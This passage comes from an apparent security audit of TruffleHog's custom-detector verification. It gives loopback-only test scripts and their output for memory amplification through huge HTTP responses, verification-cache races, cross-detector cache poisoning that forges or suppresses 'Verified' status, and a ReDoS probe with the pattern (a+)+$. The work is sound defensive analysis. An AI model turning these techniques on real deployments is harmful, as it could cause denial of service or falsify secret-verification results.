        length = int(self.headers.get("Content-Length", "0") or "0")
        _ = self.rfile.read(length) if length else b""
        sys.stdout.write("REQUEST #%d %s %s bodylen=%d\n" % (n, self.command, self.path, BIGN)); sys.stdout.flush()
        self.send_response(200); self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(BIGN)); self.end_headers()
        remaining = BIGN; buf = b"A" * CHUNK
        while remaining > 0:
            w = CHUNK if remaining >= CHUNK else remaining
            self.wfile.write(buf[:w]); remaining -= w
    def do_POST(self): self._handle()
    def do_GET(self): self._handle()
    def log_message(self, *a): return
srv = http.server.ThreadingHTTPServer(("127.0.0.1", PORT), H)
sys.stdout.write("BIGSERVER-READY port=%d bign=%d pid=%d\n" % (PORT, BIGN, os.getpid())); sys.stdout.flush()
srv.serve_forever()
```

```python
# ---- runmaxrss.py (run a child; report its PEAK RSS via os.wait4 ru_maxrss, KB) ----
import os, sys
argv = sys.argv[1:]
pid = os.fork()
if pid == 0:
    try: os.execv(argv[0], argv)
    except Exception as e:
        sys.stderr.write("exec failed: %s\n" % e); os._exit(127)
else:
    _, status, ru = os.wait4(pid, 0)
    print("ru_maxrss_KB=%d exit=%d" % (ru.ru_maxrss, os.waitstatus_to_exitcode(status)))
```

Scenario script (self-contained; sources `lib.sh` from §2.3):

```bash
# ---- scripts/14_response_memory.sh ----
#!/usr/bin/env bash
# Measure the scanner's PEAK RSS across growing 200-OK response body sizes,
# through the canonical filesystem --config path. One canonical match => one
# verification => one response read; only 200 bytes are ultimately retained.
source /tmp/th_harness/scripts/lib.sh
DATA="$TH/data_mem"; make_canon_data "$DATA"
BIG="$TH/bigserver.py"; WRAP="$TH/runmaxrss.py"

run_size() {  # run_size BYTES LABEL
  local bign="$1" label="$2"
  read P < <(pick_ports 1)
  TH_PORT="$P" TH_BIGN="$bign" nohup python3 "$BIG" >/dev/null 2>&1 &
  local sp=$!; PIDS+=("$sp")
  python3 - "$P" <<'PY'
import socket,sys,time
p=int(sys.argv[1])
for _ in range(50):
    s=socket.socket(); s.settimeout(0.2); r=s.connect_ex(("127.0.0.1",p)); s.close()
    if r==0: sys.exit(0)
    time.sleep(0.1)
sys.exit(1)
PY
  local CFG="$TH/mem_${label}.yaml"
  cat > "$CFG" <<CFG
detectors:
  - name: HogTokenDetector
    keywords: [hog]
    regex:
      token: '$REGEX'
    verify:
      - endpoint: http://127.0.0.1:$P/
        unsafe: true
        headers: ["$AUTH"]
CFG
  local CLI="$EV/mem_${label}.out" rss verified
  env NO_PROXY=127.0.0.1 no_proxy=127.0.0.1 \
    python3 "$WRAP" "$BIN" filesystem "$DATA" --config="$CFG" --no-update >"$CLI" 2>&1
  rss=$(grep -oE 'ru_maxrss_KB=[0-9]+' "$CLI" | head -1 | cut -d= -f2)
  verified=$(grep -qE 'Found verified result' "$CLI" && echo verified || echo other)
  printf "body=%-9s result=%-9s peakRSS=%6d KB (%5d MiB)\n" \
    "$label" "$verified" "${rss:-0}" "$(( ${rss:-0} / 1024 ))"
  kill "$sp" 2>/dev/null || true; PIDS=("${PIDS[@]/$sp}")
}

echo "################ scanner PEAK RSS vs 200-OK response body size ################"
echo "(one canonical match => one verification => one response read; only 200 bytes retained)"
run_size 0          "0MiB"
run_size 8388608    "8MiB"
run_size 33554432   "32MiB"
run_size 67108864   "64MiB"
run_size 134217728  "128MiB"
stop_all >/dev/null 2>&1
```

Complete, unedited output:

```text
################ scanner PEAK RSS vs 200-OK response body size ################
(one canonical match => one verification => one response read; only 200 bytes retained)
body=0MiB      result=verified  peakRSS=182272 KB (  178 MiB)
body=8MiB      result=verified  peakRSS=228352 KB (  223 MiB)
body=32MiB     result=verified  peakRSS=307200 KB (  300 MiB)
body=64MiB     result=verified  peakRSS=434176 KB (  424 MiB)
body=128MiB    result=verified  peakRSS=613376 KB (  599 MiB)
```

Interpretation (OBSERVED): peak RSS climbs monotonically with the response size — from **178 MiB** at a 0-byte body (the ~194 MB static binary plus runtime baseline) to **599 MiB** at a 128 MiB body. The increment tracks roughly **2–3×** the body size, consistent with `io.ReadAll` allocating the body once [:253] and `string(body)` copying it again [:259] on top of transport buffering. Every run reports `verified` and retains only 200 bytes in `ExtraData["response"]`, so the memory is spent purely reading data that is then discarded. Because the read is driven per successful verification, this cost is additionally multiplied by amplification (§5): N verified permutations each read their endpoint's full body. This is a memory-amplification/DoS surface available to whoever controls the endpoint (or, via §6.5, a redirect target). Re-running the experiment reproduces the **same monotonic trend** and the same order of magnitude (the 128 MiB body consistently drives peak RSS to ≈600 MiB); the exact KB varies by a few MiB run-to-run, as expected for a peak-RSS measurement. *(Root cause and a bounded-read recommendation — e.g. `io.LimitReader` — are noted for reference only; no source change is made, per the read-only scope.)*

---

## 7. Verification caching — dedup, concurrency dependence, and cross-detector isolation

**Direct answer:** With the verification cache enabled (the default), identical secret bytes *can* be de-duplicated so repeated occurrences do not each hit the network — **but this suppression is not guaranteed**. Verification runs across `concurrency × detectorWorkerMultiplier` detector workers (the multiplier defaults to **8** [pkg/engine/engine.go:343-345, spawned at :676]), and the cache short-circuits a chunk only when **every** result in it is already a hit [pkg/verificationcache/verification_cache.go:103-106]; a cold, concurrent scan therefore has all workers miss before any verify-pass writes, yielding **no** suppression. Observed: 40 identical-token files give `AttemptsSaved > 0` and `< 40` POSTs at `--concurrency=1`, but **exactly 40 POSTs and `AttemptsSaved: 0`** at `--concurrency=128` — identical to disabling the cache (§7.5). Moreover, the cache key is `hash(Raw + RawV2 + DetectorType)` [verification_cache.go:136-147], which **excludes** the detector name and the verifier configuration (endpoint/headers) and uses a **fixed** `DetectorType` (`904`, CustomRegex) for every custom detector — so two different detectors that match the **same** bytes share one cache entry, and one can poison the other's verified/unverified status (observed in **both** directions, §7.6). Disabling the cache (`--no-verification-cache`) verifies every occurrence.

### 7.1 Code path

**[SOURCE-DERIVED / INFERRED]** In `pkg/verificationcache/verification_cache.go`:
- If there is no result cache, or verification is off, or a forced cache update is requested, it verifies directly [verification_cache.go:58-67].
- Otherwise it first generates results **without** verifying and looks each up: a hit copies the cached outcome and marks `VerificationFromCache=true` [verification_cache.go:90-94]; on the **first** miss it records the miss, sets `isEverythingCached=false`, and **breaks** [verification_cache.go:95-99].
- Only if **everything** was cached does it short-circuit (increment "verifications saved" and return) [verification_cache.go:103-106]; otherwise it falls through to a **full** verify pass and stores results with the raw secret stripped (`Raw`/`RawV2` set to nil) [verification_cache.go:128-129].
- The key is built from `bytes.Join([Raw, RawV2], nil)` plus the `DetectorType` (big-endian) fed to the hasher [verification_cache.go:136-147] — **no** endpoint, header, or detector-name bytes participate.

### 7.2 Scenario script (self-contained; sources `lib.sh` from §2.3)

```bash
# ---- scripts/07_cache.sh ----
#!/usr/bin/env bash
# Evidence: the verification cache keys on hash(Raw+RawV2+DetectorType)
# (verification_cache.go:136-147) — identical secrets dedupe. Cache ON: many
# identical-token files => far fewer POSTs (AttemptsSaved>0). Cache OFF
# (--no-verification-cache): every occurrence re-verified.
source /tmp/th_harness/scripts/lib.sh
read P < <(pick_ports 1)
CDIR="$TH/cache_dup"; rm -rf "$CDIR"; mkdir -p "$CDIR"
T1='hog token: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1'   # one identical token, 40 chars
for i in $(seq -w 1 40); do printf '%s\n' "$T1" > "$CDIR/f$i.txt"; done
echo "created $(ls "$CDIR" | wc -l) files, each the SAME token"
CFG="$TH/cache.yaml"
cat > "$CFG" <<CFG
detectors:
  - name: HogTokenDetector
    keywords: [hog]
    regex:
      token: '$REGEX'
    verify:
      - endpoint: http://127.0.0.1:$P/
        unsafe: true
        headers: ["$AUTH"]
CFG

echo "################ CACHE ON (default): 40 identical-token files ################"
L="$EV/cache_on.log"; start_server "$P" 200 "$L"
CLI="$EV/cache_on_cli.out"
env NO_PROXY=127.0.0.1 no_proxy=127.0.0.1 "$BIN" filesystem "$CDIR" --config="$CFG" --no-update >"$CLI" 2>&1
echo "SERVER_POSTS=$(posts "$L")  (expect << 40 due to cache dedupe)"
grep -oE '"verification_caching": \{[^}]*\}' "$CLI"
grep -oE '"chunks": [0-9]+|"verified_secrets": [0-9]+' "$CLI" | tr '\n' ' '; echo
stop_all

echo ""
echo "################ CACHE OFF (--no-verification-cache): same 40 files ################"
L="$EV/cache_off.log"; start_server "$P" 200 "$L"
CLI="$EV/cache_off_cli.out"
env NO_PROXY=127.0.0.1 no_proxy=127.0.0.1 "$BIN" filesystem "$CDIR" --config="$CFG" --no-verification-cache --no-update >"$CLI" 2>&1
echo "SERVER_POSTS=$(posts "$L")  (expect == 40: every occurrence re-verified)"
grep -oE '"verification_caching": \{[^}]*\}' "$CLI"
stop_all
```

### 7.3 Complete, unedited output

```text
created 40 files, each the SAME token
################ CACHE ON (default): 40 identical-token files ################
readiness: connect_ex=0 (listening)
SERVER_POSTS=15  (expect << 40 due to cache dedupe)
"verification_caching": {"Hits":25,"Misses":55,"HitsWasted":0,"AttemptsSaved":25,"VerificationTimeSpentMS":10390}
"chunks": 40 "verified_secrets": 40

################ CACHE OFF (--no-verification-cache): same 40 files ################
readiness: connect_ex=0 (listening)
SERVER_POSTS=40  (expect == 40: every occurrence re-verified)
"verification_caching": {"Hits":0,"Misses":0,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":5116}
```

### 7.4 Interpretation (OBSERVED)

- **Cache ON (default):** 40 files carrying the **same** token → `SERVER_POSTS=15` (far fewer than 40) with `"AttemptsSaved":25` — repeated identical secrets are de-duplicated.
- **Cache OFF (`--no-verification-cache`):** the same 40 files → `SERVER_POSTS=40` and all cache counters zero — every occurrence is re-verified.
- **Concurrency dependence (OBSERVED — corrects an earlier claim):** the cache-ON POST-count is **not** bounded below 40, and `AttemptsSaved` is **not** guaranteed `> 0`. Both depend on the scheduler because the engine verifies across `concurrency × detectorWorkerMultiplier` workers (multiplier defaults to **8** [pkg/engine/engine.go:343-345, spawned at :676]) that race on the shared cache, and only an **all-hit** lookup pass short-circuits [verification_cache.go:103-106]. The run above uses the default `--concurrency` (here `NumCPU = 4` → 32 detector workers) and shows partial dedup (`15` POSTs). The full matrix in §7.5 shows cache-ON collapsing to the **same 40 POSTs / `AttemptsSaved: 0`** as cache-OFF once concurrency is high. Only the cache-**OFF** count is a stable invariant (exactly `40`).
- **Key excludes detector identity → cross-detector poisoning (OBSERVED, §7.6):** the key omits endpoint/headers/name and uses a **fixed** `DetectorType = 904` for every custom detector, so two detectors that match the **same** secret bytes collide on one shared cache entry. The first detector to verify a token populates the entry the other detector then reads via `CopyVerificationInfo` [pkg/detectors/detectors.go:120-123] — so one team's detector can make another's result **falsely `Verified`**, or **suppress** a genuine verification. §7.6 reproduces both directions (36 of 40 of the victim detector's results flipped). Changing only the endpoint (same secret) likewise does **not** create a new key, so a config author cannot force re-verification merely by pointing at a different URL with the cache enabled.

### 7.5 Concurrency dependence of cache suppression (OBSERVED — Issue-2 correction)

The suppression counted in §7.3 is a *best case*, not an invariant. The engine spawns `numWorkers := e.concurrency * e.detectorWorkerMultiplier` detector workers [pkg/engine/engine.go:676], and the multiplier defaults to **8** when unset [pkg/engine/engine.go:343-345]. So even `--concurrency=1` runs **8** concurrent verification workers; `--concurrency=1` does **not** serialize verification. The cache only removes a POST when a chunk's lookup pass is an **all-hit** (`isEverythingCached`) [verification_cache.go:103-106], and an entry is written only **after** a verify-pass POST completes [verification_cache.go:128-130]. When many workers look up the same cold key **before** the first POST has returned and written it, they all miss and all POST.

To make that race deterministic on a 4-core box (`nproc = 4`), the endpoint is given a fixed per-request delay via a small documented helper, `slowserver.py` (loopback-only, threaded; the same logging contract as `capture_server.py` from §2.3, plus `TH_DELAY_MS`):

```python
# ---- slowserver.py (latency-capable loopback capture server; §7.5/§7.6) ----
import http.server, os, sys, threading, time
PORT = int(os.environ["TH_PORT"]); STATUS = int(os.environ.get("TH_STATUS", "200"))
DELAY_MS = int(os.environ.get("TH_DELAY_MS", "0")); LOG = os.environ.get("TH_LOG", "")
_counter = 0; _lock = threading.RLock()
def _record(text):
    line = text if text.endswith("\n") else text + "\n"
    with _lock:
        sys.stdout.write(line); sys.stdout.flush()
        if LOG:
            with open(LOG, "a") as fh: fh.write(line)
class Handler(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    def _handle(self):
        global _counter
        with _lock:
            _counter += 1; n = _counter
        length = int(self.headers.get("Content-Length", "0") or "0")
        _ = self.rfile.read(length) if length else b""
        _record("REQUEST-LINE: %s %s %s (#%d)" % (self.command, self.path, self.request_version, n))
        if DELAY_MS: time.sleep(DELAY_MS / 1000.0)
        self.send_response(STATUS); self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", "0"); self.end_headers()
    def do_GET(self): self._handle()
    def do_POST(self): self._handle()
    def log_message(self, fmt, *args): return
def main():
    server = http.server.ThreadingHTTPServer(("127.0.0.1", PORT), Handler)
    _record("SERVER-READY port=%d status=%d delay_ms=%d pid=%d" % (PORT, STATUS, DELAY_MS, os.getpid()))
    server.serve_forever()
if __name__ == "__main__": main()
```

Scenario script (40 files, all the same token; the canonical `HogTokenDetector` with `unsafe: true`; the endpoint delays each response by 250 ms):

```bash
# ---- scripts/15b_cache_latency.sh ----
#!/usr/bin/env bash
source /tmp/th_harness/scripts/lib.sh
SLOW="$TH/slowserver.py"; DELAY_MS="${DELAY_MS:-250}"
CDIR="$TH/cc_dup"; rm -rf "$CDIR"; mkdir -p "$CDIR"
T1='hog token: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1'
for i in $(seq -w 1 40); do printf '%s\n' "$T1" > "$CDIR/f$i.txt"; done
CFG="$TH/ccl.yaml"
cat > "$CFG" <<CFG
detectors:
  - name: HogTokenDetector
    keywords: [hog]
    regex:
      token: '$REGEX'
    verify:
      - endpoint: http://127.0.0.1:__PORT__/
        unsafe: true
        headers: ["$AUTH"]
CFG
start_slow() { local port="$1" log="$2"; : > "$log"
  TH_PORT="$port" TH_STATUS=200 TH_DELAY_MS="$DELAY_MS" TH_LOG="$log" \
    nohup python3 "$SLOW" >/dev/null 2>&1 & PIDS+=($!)
  python3 - "$port" <<'PY'
import socket,sys,time
p=int(sys.argv[1])
for _ in range(50):
    s=socket.socket(); s.settimeout(0.2); r=s.connect_ex(("127.0.0.1",p)); s.close()
    if r==0: sys.exit(0)
    time.sleep(0.1)
sys.exit(1)
PY
}
run() { local label="$1" conc="$2" extra="$3"
  read P < <(pick_ports 1); local L="$EV/ccl_${label}.log"; start_slow "$P" "$L"
  local CFG2="$TH/ccl_${label}.yaml"; sed "s/__PORT__/$P/" "$CFG" > "$CFG2"
  local CLI="$EV/ccl_${label}.out"
  env NO_PROXY=127.0.0.1 no_proxy=127.0.0.1 "$BIN" filesystem "$CDIR" \
    --config="$CFG2" --concurrency="$conc" $extra --no-update >"$CLI" 2>&1
  local n; n=$(grep -c '^REQUEST-LINE' "$L" 2>/dev/null); n=${n:-0}
  local vc; vc=$(grep -oE '"verification_caching": \{[^}]*\}' "$CLI" | head -1)
  printf "%-30s POSTS=%-3d %s\n" "$label" "$n" "$vc"; stop_all >/dev/null 2>&1
}
echo "############ 40 identical-token files, endpoint delay=${DELAY_MS}ms ############"
echo "--- cache ON, --concurrency=1 (serial control) ---";   run "ON_c1"      1   ""
echo "--- cache ON, --concurrency=128 (concurrent; x3) ---"; run "ON_c128_r1" 128 ""; run "ON_c128_r2" 128 ""; run "ON_c128_r3" 128 ""
echo "--- cache OFF, --concurrency=128 ---";                 run "OFF_c128"   128 "--no-verification-cache"
```

Complete, unedited output:

```text
############ 40 identical-token files, endpoint delay=250ms ############
--- cache ON, --concurrency=1 (serial control) ---
ON_c1                          POSTS=8   "verification_caching": {"Hits":68,"Misses":12,"HitsWasted":0,"AttemptsSaved":68,"VerificationTimeSpentMS":2419}
--- cache ON, --concurrency=128 (concurrent; x3) ---
ON_c128_r1                     POSTS=40  "verification_caching": {"Hits":0,"Misses":80,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":19627}
ON_c128_r2                     POSTS=40  "verification_caching": {"Hits":0,"Misses":80,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":20126}
ON_c128_r3                     POSTS=40  "verification_caching": {"Hits":0,"Misses":80,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":20298}
--- cache OFF, --concurrency=128 ---
OFF_c128                       POSTS=40  "verification_caching": {"Hits":0,"Misses":0,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":20422}
```

Interpretation (OBSERVED):
- `--concurrency=1` still POSTs **8** times (= `1 × 8` detector workers), not once — the flag does not serialize verification. Deduplication is real but partial (`AttemptsSaved: 68`).
- `--concurrency=128`, repeated **3×**, POSTs **exactly 40** every time with **`AttemptsSaved: 0`** — the cache provides **no** suppression and behaves identically to disabling it. This directly **falsifies** the earlier claim that cache-ON "always yields `< 40` POSTs with `AttemptsSaved > 0`."
- Even **without** the added latency (re-running the same matrix against the stock instant `capture_server.py` from §2.3), high concurrency already degrades and is **non-deterministic** — three `--concurrency=128` runs produced `POSTS=12`, `17`, and `19` (`AttemptsSaved` `28`, `23`, `21`). The 250 ms delay only widens the window enough to reach the deterministic worst case on 4 cores; on a many-core host the worst case occurs with no added latency (this matches the QA reproduction of "128 concurrency → 40 POSTs / 0 saved").

**Operational significance:** cache-based dedup must **not** be relied on as an amplification control. Under normal/default and high concurrency a config author's endpoint can still receive one POST per matched occurrence (§5 amplification stacks on top). *(A stable, per-detector-scoped cache identity would fix both this and §7.6; noted for reference only — no source change is made, per the read-only scope.)*

### 7.6 Cross-detector verified/unverified status poisoning (OBSERVED — Issue 6)

There is exactly **one** verification cache per engine [pkg/engine/engine.go:227], and it is invoked for **every** detector with the detector passed in as an argument [pkg/engine/engine.go:1070]; its backing store is a single `simple.NewCache[detectors.Result]()` [main.go:536]. Because the key is `hash(Raw + RawV2 + DetectorType)` [verification_cache.go:136-147] with `DetectorType = 904` fixed for all custom detectors [pkg/pb/detectorspb/detectors.pb.go:1010], two *different* custom detectors that match the **same** token produce the **same** key and share one entry. Whichever detector verifies that token first writes the entry [verification_cache.go:128-130]; the other detector's lookup pass then hits it and copies its `Verified`/`verificationError` via `CopyVerificationInfo` [pkg/detectors/detectors.go:120-123] — often short-circuiting its own POST entirely.

Two `CustomRegex` detectors, `HogDetA` and `HogDetB`, share the canonical token/regex but point at **different** endpoints: `A` → `200` (would verify), `B` → `403` (would not). Baseline + collision script:

```bash
# ---- scripts/16_cache_poisoning.sh ----
#!/usr/bin/env bash
source /tmp/th_harness/scripts/lib.sh
SAME='hog token: ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ9'
CDIR="$TH/poison_dup"; rm -rf "$CDIR"; mkdir -p "$CDIR"
for i in $(seq -w 1 40); do printf '%s\n' "$SAME" > "$CDIR/f$i.txt"; done
read AP BP < <(pick_ports 2)
ALOG="$EV/poison_A200.log"; BLOG="$EV/poison_B403.log"
start_server "$AP" 200 "$ALOG" >/dev/null      # A verifies (200)
start_server "$BP" 403 "$BLOG" >/dev/null      # B does not (403)
mkcfg() { local order="$1" out="$2"
  { echo "detectors:"
    emitA() { printf '  - name: HogDetA\n    keywords: [hog]\n    regex: {token: '"'"'%s'"'"'}\n    verify:\n      - endpoint: http://127.0.0.1:%s/\n        unsafe: true\n        headers: ["%s"]\n' "$REGEX" "$AP" "$AUTH"; }
    emitB() { printf '  - name: HogDetB\n    keywords: [hog]\n    regex: {token: '"'"'%s'"'"'}\n    verify:\n      - endpoint: http://127.0.0.1:%s/\n        unsafe: true\n        headers: ["%s"]\n' "$REGEX" "$BP" "$AUTH"; }
    if [ "$order" = AB ]; then emitA; emitB; else emitB; emitA; fi
  } > "$out"; }
run() { local label="$1" order="$2" extra="$3"
  : > "$ALOG"; : > "$BLOG"; local cfg="$TH/poison_${label}.yaml"; mkcfg "$order" "$cfg"
  local out="$EV/poison_${label}.json"
  env NO_PROXY=127.0.0.1 no_proxy=127.0.0.1 "$BIN" filesystem "$CDIR" \
    --config="$cfg" --concurrency=1 $extra --no-update --json >"$out" 2>/dev/null
  local ap bp v u
  ap=$(grep -c 'REQUEST-LINE' "$ALOG"); ap=${ap:-0}; bp=$(grep -c 'REQUEST-LINE' "$BLOG"); bp=${bp:-0}
  v=$(grep -o '"Verified":true'  "$out" | wc -l | tr -d ' '); u=$(grep -o '"Verified":false' "$out" | wc -l | tr -d ' ')
  printf "%-26s A200_POSTS=%-3d B403_POSTS=%-3d  Verified=%-3d Unverified=%-3d\n" "$label" "$ap" "$bp" "$v" "$u"; }
echo "--- cache OFF (baseline: both verify independently) ---"; run "OFF_orderAB" AB "--no-verification-cache"
echo "--- cache ON, config order [A(200) then B(403)] ---";     run "ON_orderAB"  AB ""
echo "--- cache ON, config order [B(403) then A(200)] ---";     run "ON_orderBA"  BA ""
```

Complete, unedited output:

```text
--- cache OFF (baseline: both verify independently) ---
OFF_orderAB                A200_POSTS=40  B403_POSTS=40   Verified=40  Unverified=40 
--- cache ON, config order [A(200) then B(403)] ---
ON_orderAB                 A200_POSTS=4   B403_POSTS=4    Verified=5   Unverified=75 
--- cache ON, config order [B(403) then A(200)] ---
ON_orderBA                 A200_POSTS=4   B403_POSTS=4    Verified=30  Unverified=50 
```

- **Cache OFF** is the correct, isolated baseline: `A` POSTs 40 times and yields **40 verified**, `B` POSTs 40 times and yields **40 unverified** — 80 POSTs, each detector reflecting its own endpoint.
- **Cache ON** collapses the two detectors to **4 + 4 = 8** POSTs total (the `1 × 8` cold-worker warmup): `B`'s lookups are satisfied by entries `A` wrote and vice-versa — proving the cache is **not** isolated by detector. The resulting `Verified`/`Unverified` split (`5/75`, `30/50`) no longer matches the clean `40/40` baseline; results are contaminated across detectors, and the exact split is scheduler-dependent.

To pin the **direction** deterministically, give the intended "winner" an instant endpoint and the "loser" an 800 ms endpoint (via `slowserver.py`), so the winner writes the shared entry before the loser's lookup pass reads it:

```bash
# ---- scripts/16b_poison_directional.sh (winner instant, loser 800ms) ----
# winner listed first in config; A=200(verify), B=403(no-verify); cache ON, 40 files.
# A wins => B inherits Verified=true (false-verify); B wins => A inherits Verified=false (suppression).
# (full script in the harness; identical structure to 16_ but the winner's TH_DELAY_MS=0
#  and the loser's TH_DELAY_MS=800, both served by slowserver.py; --concurrency=1)
```

Complete, unedited output (each direction run **twice** — stable):

```text
###### Directional cross-detector poisoning (winner instant, loser 800ms), 40 files, cache ON ######
--- A(200) wins  => B(403) inherits Verified=true (false-verify of the 403 detector) ---
A_wins_r1                A(200)_POSTS=4   B(403)_POSTS=4    Verified=76  Unverified=4  
A_wins_r2                A(200)_POSTS=4   B(403)_POSTS=4    Verified=76  Unverified=4  
--- B(403) wins  => A(200) inherits Verified=false (suppressed verification of the 200 detector) ---
B_wins_r1                A(200)_POSTS=4   B(403)_POSTS=4    Verified=4   Unverified=76 
B_wins_r2                A(200)_POSTS=4   B(403)_POSTS=4    Verified=4   Unverified=76 
```

Interpretation (OBSERVED):
- **False verification.** When `A` (endpoint `200`) wins, the total is **76 verified / 4 unverified** out of 80 results. `A`'s 40 are correctly verified; **36 of `B`'s 40** are reported `Verified=true` **despite `B`'s endpoint returning `403`** and, in fact, `B` never contacting it for those 36 (only the 4 cold-warmup POSTs reached `B`'s `403`). A detector whose secret is genuinely invalid is thereby reported **verified**.
- **Suppressed verification.** When `B` (endpoint `403`) wins, the total inverts to **4 verified / 76 unverified**: **36 of `A`'s 40** are reported `Verified=false` **despite `A`'s endpoint returning `200`** — a genuine verification is silently suppressed.
- Both directions are stable across repeats, and the `36` flipped results match the QA reproduction exactly ("A faster → B receives 36 cached `Verified=true`"; "B faster → A receives 36 cached `Verified=false`"). The `4 + 4` residual POSTs are again the `1 × 8` cold-worker warmup before the winner's first write lands.

**Security significance:** in a multi-tenant deployment (the stated threat model), one team's detector can **forge** a `Verified=true` for another team's secret, or **mask** a real leak by suppressing its verification — purely because the two happen to match overlapping bytes and the shared cache key ignores detector identity. This is an integrity break in the verification result itself, on top of the amplification concerns in §5/§7.5. *(A per-detector cache namespace or the inclusion of a stable detector/verifier identity in the key would remove it; noted for reference only — no source change is made, per the read-only scope.)*

---

## 8. Regular-expression denial of service (ReDoS)

**Direct answer:** Custom-detector patterns are compiled with Go's `regexp` package, which is the **RE2** engine. RE2 guarantees matching in time **linear** in the input length and has **no backtracking**, so the classic catastrophic pattern `(a+)+$` cannot be made to blow up. There is no per-pattern timeout in this code path, but none is needed for backtracking ReDoS because the engine structurally precludes it. (A pattern can still be *slow-linear* on huge inputs, and RE2 lacks lookahead — which is why TruffleHog offers the `validations` feature; see §10.)

### 8.1 Code path

**[SOURCE-DERIVED / INFERRED]** Patterns are compiled by `ValidateRegex` via `regexp.Compile(reg)` [pkg/custom_detectors/validation.go:23-33, compile at L28] at config-load time, and matching in `FromData` uses the same standard `regexp` package. Go's `regexp` is RE2 (linear time, no backtracking — corroborated in §10).

### 8.2 The probe (a distinct detector — attribution note)

**[OBSERVED]** This is the **only** experiment that uses a detector other than `HogTokenDetector`: a dedicated `ReDoSProbe` whose regex is the catastrophic `(a+)+$`. The input is `N` repetitions of `a` followed by a single `!`. The trailing `!` **forces the match to fail at the `$` anchor** (`match=false`) — precisely the condition that drives a backtracking engine into exponential work, and therefore the strongest ReDoS trigger. Scenario script:

```bash
# ---- scripts/08_redos.sh ----
#!/usr/bin/env bash
# Evidence: Go's regexp (RE2) is linear-time; the classic catastrophic pattern
# (a+)+$ does NOT blow up. Canonical CLI scan_duration (END-TO-END) at growing
# inputs, an isolated Go RE2 microbenchmark, and a NON-CANONICAL Python
# backtracking-engine contrast on the same pattern/inputs.
source /tmp/th_harness/scripts/lib.sh
RD="$TH/redos"; rm -rf "$RD"; mkdir -p "$RD"
CFG="$TH/redos.yaml"
cat > "$CFG" <<'CFG'
detectors:
  - name: ReDoSProbe
    keywords: [a]
    regex:
      redos: '(a+)+$'
CFG
echo "--- ReDoSProbe config (name=ReDoSProbe, NOT HogTokenDetector) ---"; cat "$CFG"

echo ""
echo "################ CANONICAL CLI: (a+)+\$ vs N 'a's + '!' (forces FAILING match at \$) ################"
for N in 1000 10000 50000 100000 200000; do
  python3 -c "import sys;open(sys.argv[1],'w').write('a'*int(sys.argv[2])+'!')" "$RD/in.txt" "$N"
  CLI="$EV/redos_cli_${N}.out"
  env NO_PROXY=127.0.0.1 no_proxy=127.0.0.1 "$BIN" filesystem "$RD" --config="$CFG" --no-update >"$CLI" 2>&1
  DUR=$(grep -oE '"scan_duration": "[^"]+"' "$CLI" | sed 's/.*: "//;s/"//' | tail -1)
  echo "N=${N} 'a's  end_to_end_scan_duration=${DUR}"
done

echo ""
echo "################ ISOLATED Go regexp (RE2) microbenchmark — pure engine time ################"
export PATH=$PATH:/usr/local/go/bin
cat > "$TH/redos_bench.go" <<'GO'
package main
import ( "fmt"; "regexp"; "strings"; "time" )
func main() {
	re := regexp.MustCompile(`(a+)+$`)
	for _, n := range []int{10000, 100000, 1000000, 5000000} {
		input := strings.Repeat("a", n) + "!"
		start := time.Now()
		m := re.FindStringSubmatch(input)
		fmt.Printf("ISOLATED-GO-RE2  n=%-8d match=%-5v  regex_eval=%v\n", n, m != nil, time.Since(start))
	}
}
GO
( cd "$REPO" && go run "$TH/redos_bench.go" ) 2>&1 | tee "$EV/redos_go_isolated.out"

echo ""
echo "################ NON-CANONICAL COMPARISON: Python re (backtracking) — same pattern ################"
echo "(NOT TruffleHog; illustrates the catastrophic backtracking that RE2 structurally avoids)"
python3 - <<'PY' 2>&1 | tee "$EV/redos_python_noncanonical.out"
import re, time
pat = re.compile(r'(a+)+$')
for n in [22, 26, 28, 30]:
    s = 'a'*n + '!'
    t=time.perf_counter(); pat.search(s); el=time.perf_counter()-t
    print(f"NON-CANONICAL-PY  n={n:<4} eval={el:.4f}s")
PY
```

### 8.3 Complete, unedited output

```text
--- ReDoSProbe config (name=ReDoSProbe, NOT HogTokenDetector) ---
detectors:
  - name: ReDoSProbe
    keywords: [a]
    regex:
      redos: '(a+)+$'

################ CANONICAL CLI: (a+)+$ vs N 'a's + '!' (forces FAILING match at $) ################
N=1000 'a's  end_to_end_scan_duration=4.226018ms
N=10000 'a's  end_to_end_scan_duration=7.335057ms
N=50000 'a's  end_to_end_scan_duration=11.752625ms
N=100000 'a's  end_to_end_scan_duration=15.538695ms
N=200000 'a's  end_to_end_scan_duration=28.256253ms

################ ISOLATED Go regexp (RE2) microbenchmark — pure engine time ################
ISOLATED-GO-RE2  n=10000    match=false  regex_eval=979.747µs
ISOLATED-GO-RE2  n=100000   match=false  regex_eval=4.676618ms
ISOLATED-GO-RE2  n=1000000  match=false  regex_eval=47.501892ms
ISOLATED-GO-RE2  n=5000000  match=false  regex_eval=243.267129ms

################ NON-CANONICAL COMPARISON: Python re (backtracking) — same pattern ################
(NOT TruffleHog; illustrates the catastrophic backtracking that RE2 structurally avoids)
NON-CANONICAL-PY  n=22   eval=0.3819s
NON-CANONICAL-PY  n=26   eval=5.3927s
NON-CANONICAL-PY  n=28   eval=21.4930s
NON-CANONICAL-PY  n=30   eval=86.8946s
```

### 8.4 Interpretation (OBSERVED, with precise metric labels)

- **Canonical CLI — end-to-end scan duration [OBSERVED]:** through the real `--config` path, the reported `scan_duration` grows roughly linearly with input size (≈4.2 ms at 1 000 `a`s → ≈28.3 ms at 200 000 `a`s). This figure is the **whole-scan** wall time (file I/O, chunking, detector dispatch, and matching), **not** an isolated regex measurement — so it is an upper bound on the regex cost, and it is bounded.
